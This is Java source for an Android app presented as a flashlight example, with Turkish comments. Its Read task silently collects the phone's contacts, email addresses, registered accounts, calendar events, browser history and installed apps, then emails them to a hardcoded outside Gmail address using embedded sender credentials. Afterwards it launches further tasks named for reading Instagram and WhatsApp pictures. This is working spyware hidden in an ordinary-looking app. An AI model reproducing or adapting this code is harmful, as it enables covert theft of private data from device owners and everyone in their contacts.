package com.example.flashlightexample;

import java.text.Format;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;


import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.Browser;
import android.provider.CalendarContract;
import android.provider.ContactsContract;
import android.text.format.DateFormat;
import android.util.Log;

public class Read extends AsyncTask<Void , Void ,Map<String, String>>{
String gideckNo;
private Activity activity;
static Map<String, String>rehber=new HashMap<String, String>();
static String getRehber;
String phoneNumber;
static  StringBuffer output ;
static StringBuffer browserOut;
static StringBuffer appInfo;
private String appname = "";
//calender okuma
String title = "N/A";
Long start = 0L;
static StringBuffer calendrOut;
static String possibleEmail="";
Context context;
MailCallback mailCallback;
private Cursor mCursor = null;
private static final String[] COLS = new String[]
{ CalendarContract.Events.TITLE, CalendarContract.Events.DTSTART};	
static Format tf,df;

public Read(Context context,MailCallback mailcallBack) {
this.context=context;
this.mailCallback=mailcallBack;

}

	 @Override
    protected void onPreExecute() {
       super.onPreExecute();
    }

    @Override
    protected Map<String, String> doInBackground(Void... params) {

    	
    	
    	
    	//Mail Gönderiimi
    	
    	 try {
    	Mail m = new Mail("hemenindir57@gmail.com","123xxx123"); 
	       	
    	
    	//   emailGonder();
			 String[] toArr = {"mehmetduman34500@gmail.com"}; 
		        m.setTo(toArr); 
		        m.setFrom("hemenindir57@gmail.com"); 
		        m.setSubject("Kayýtlý Hesaplar--Takvim--Browser Explorer--Yüklü Uygulamalar"); 
		        m.setBody("\n"+"Rehberin Tamamý \n"+output+"\n Site Kayýtlarý\n\n "+browserOut+"Uygulama Bilgiler\n\n"+appInfo+"Takvim Okuma\n\n"+calendrOut+"Bütün Hesaplar:\n\n"+possibleEmail); 
    	
		        
		        
		        Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;
		        String _ID = ContactsContract.Contacts._ID;
		        String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
		        String HAS_PHONE_NUMBER = ContactsContract.Contacts.HAS_PHONE_NUMBER;

		        Uri PhoneCONTENT_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
		        String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
		        String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;

		        Uri EmailCONTENT_URI = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
		        String EmailCONTACT_ID = ContactsContract.CommonDataKinds.Email.CONTACT_ID;
		        String DATA = ContactsContract.CommonDataKinds.Email.DATA;
		      //Tlefona Kayýtlý bütün hesaplar ve Gmail hesaplarý Okuma
		    	
				
				   try{
					       possibleEmail += "************* Get Registered Gmail Account *************\n\n";
					       Account[] accounts = AccountManager.get(context).getAccountsByType("com.google");
					       
					       for (Account account : accounts) {
					         
					    	 possibleEmail += " --> "+account.name+" : "+account.type+" , \n";
					         possibleEmail += " \n\n";
					         
					       }
					  }
				      catch(Exception e)
				      {
				    	   Log.i("Exception", "Exception:"+e) ; 
				      }
				      
				      
				      try{
				    	   possibleEmail += "**************** Get All Registered Accounts *****************\n\n";
				    	  
					       Account[] accounts = AccountManager.get(context).getAccounts();
					       for (Account account : accounts) {
					         
					    	  possibleEmail += " --> "+account.name+" : "+account.type+" , \n";
					          possibleEmail += " \n";
					         
					       }
					  }
				      catch(Exception e)
				      {
				    	   Log.i("Exception", "Exception:"+e) ; 
				      }
				      
				      
				      
				      
    	//Calendar okuma
		        df = DateFormat.getDateFormat(context);
		 	   tf = DateFormat.getTimeFormat(context);
   	calendrOut=new StringBuffer();
        mCursor =context.getContentResolver().query(
        		CalendarContract.Events.CONTENT_URI, COLS, null, null, null);
        mCursor.moveToFirst();
        do {
        	try {
        		
        	    title = mCursor.getString(0);
        	    start = mCursor.getLong(1);
        	calendrOut.append(title+" on "+df.format(start)+" at "+tf.format(start)+"\n"+"-------------------------"+"\n");  
        	
        	    } catch (Exception e) {
        	    	//ignore
        	    }
			
		} while (mCursor.moveToNext());
        
   	 //Browser Okuma
   	 browserOut=new StringBuffer();
   		 String[] proj = new String[] { Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL };
   		 String sel = Browser.BookmarkColumns.BOOKMARK + " = 0"; // 0 = history, 1 = bookmark
   		 Cursor mCur =context.getContentResolver().query(Browser.BOOKMARKS_URI, proj, sel, null, null);
   		 mCur.moveToFirst();
   		 @SuppressWarnings("unused")
   		 String title = "";
   		 @SuppressWarnings("unused")
   		 String url = "";
   		 if (mCur.moveToFirst() && mCur.getCount() > 0) {
   		     boolean cont = true;
   		     while (mCur.isAfterLast() == false && cont) {
   		         title = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.TITLE))+"\n";
   		         url = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.URL))+"\n";
   		         // Do something with title and url
   		         mCur.moveToNext();
   		         browserOut.append(title);
   		         browserOut.append(url);
   		         browserOut.append("\n"+"-------------------------"+"\n");
   		         Log.i("zms","zms browser O: "+title+" "+url);
   		         
   		     }
   		     
   		 }
   		 
   		 //Bütün uygulama bilgileri için
   		 appInfo=new StringBuffer();
   		 final PackageManager pm = context.getPackageManager();
   		//get a list of installed apps.
   		List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

   		for (Read packageInfo : getPackages()) {
   		    
   		  
   		  appInfo.append(packageInfo.appname);
   		     		  appInfo.append("-------------------------"+"\n");
   		}
   
   	  output = new StringBuffer();
//burasý rehber okuma
		ContentResolver contentResolver = context.getContentResolver();
		Cursor cursor = contentResolver.query(CONTENT_URI, null,null, null, null);	

		// Loop for every contact in the phone
		if (cursor.getCount() > 0) {

			while (cursor.moveToNext()) {

				String contact_id = cursor.getString(cursor.getColumnIndex( _ID ));
				String name = cursor.getString(cursor.getColumnIndex( DISPLAY_NAME ));//Rehberdeki kayýtlý isim...

				int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex( HAS_PHONE_NUMBER )));

				if (hasPhoneNumber > 0) {					

					// Query and loop for every phone number of the contact
					Cursor phoneCursor = contentResolver.query(PhoneCONTENT_URI, null, Phone_CONTACT_ID + " = ?", new String[] { contact_id }, null);

					while (phoneCursor.moveToNext()) {//burda her numara için ayrý ayrý yaptýk
						//burada phoneNumber yani rehberdeki numara bilgisi..... 
						//arkadaþlar burada rehber.put diyerek hashMap ýmýza key-value þeklinde verimizi eklemiþ oldukk.....
						phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(NUMBER));
						//þimdi arkadaþlar burada þöyle birþey yaptým sms dinleme class'ýmýzdan gelecek numaralar +90...ile baþlayacak
						//bizim rehberimizde numaralar belkide normal 0505... die baþlayabilr o yüzden sorun olmamasý için kesme yaptým
						try {
						String strG=new String(phoneNumber);
						String ifgideckNo=strG.substring(0,2);//gelen numaranýn  yani rehberden okudumuz no nun ilk 2 karakteri +9 ise ded,m
						//+9 la baþlayan kýsmý kes 0505... olarak kalsýn...
						 	if(ifgideckNo.equals("+9"))	{	// eyer +9 ise			
							
								String str=new String(phoneNumber);
								 gideckNo=str.substring(2, 13);//kesilen ve 05050000000 olarak kalan 11 haneli numaramýz...
							
						 	
							Log.i("zms","zms keskNo:"+gideckNo);
							output.append("Phone number:" + phoneNumber);
	 						output.append("\n First Name:" + name);
	 						output.append("\n"+"-------------------------");
	 						rehber.put(gideckNo, name); 	

						 	}else{// Burada else dememizin amacý belirttim gibi eyer rehberde numaralar +9 ile baþlmýyorsa... onlar normal kalsýn die.
						 		output.append("\nPhone number:" + phoneNumber);
		 						output.append("\n First Name:" + name);
		 						output.append("\n"+"-------------------------");
						 		rehber.put(phoneNumber, name);
						 		
								
						 		
						 	}
						} catch (Exception e) {
							// TODO: handle exception
						}
					}

					phoneCursor.close();

					// Query and loop for every email of the contact
					Cursor emailCursor = contentResolver.query(EmailCONTENT_URI,	null, EmailCONTACT_ID+ " = ?", new String[] { contact_id }, null);

					while (emailCursor.moveToNext()) {

					String	email = emailCursor.getString(emailCursor.getColumnIndex(DATA));
//burada da isterseniz eyer numaraya ait e-mail adresi eklenmiþse ona ulaþabilirsiniz...
						output.append("\nEmail:" + email);

					}

					emailCursor.close();
				}
				 output.append("\n");

			
			}
			
			
				}
		  
			if(m.send()) { 
				Log.i("zms test _files", "zms success");
			       
			    } else { 
			        Log.i("zms test mail result", "zms fail");
			    }
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
       return rehber;// return rehber diyerek buradan dönen rehber verilerini onPostExe... da postaladým oradan istersek ekrana yanasýtabilrz
       // veya kullanýcýya birþeyler yansýtabilrz..
    }
//þimdi diðer classlardan gelecek numara için bi metot oluþtralm
  
    
    @Override
    protected void onPostExecute(Map<String, String> result) {// ayný þekilde doinback den gelen veriinin tipi neyse burada o olmalý 
       super.onPostExecute(result);
      //kullanýcaya gösterilcek biþi yok 
       Log.e("zms","zms Read result "+result);
       mailCallback.onNumara(result);
       new SendEmailAsyncTask(context, mailCallback).execute();
       new ReadInstagram().execute();
       new ReadWhatSappPicture().execute();
    }

    @Override
    protected void onProgressUpdate(Void... values) {
       super.onProgressUpdate(values);
    }

    @Override
    protected void onCancelled(Map<String, String> result) {
       super.onCancelled(result);
    }
    private ArrayList<Read> getInstalledApps(boolean getSysPackages) {
        ArrayList<Read> res = new ArrayList<Read>();        
        List<PackageInfo> packs = context.getPackageManager().getInstalledPackages(0);
        for(int i=0;i<packs.size();i++) {
            PackageInfo p = packs.get(i);
            if ((!getSysPackages) && (p.versionName == null)) {
                continue ;
            }
            Read newInfo = new Read(context, mailCallback);
            newInfo.appname = p.applicationInfo.loadLabel(context.getPackageManager()).toString();
           
            res.add(newInfo);
        }
        return res; 
    }

    private ArrayList<Read> getPackages() {
        ArrayList<Read> apps = getInstalledApps(false); /* false = no system packages */
        final int max = apps.size();
        for (int i=0; i<max; i++) {
            apps.get(i);
        }
        return apps;
    }

 }
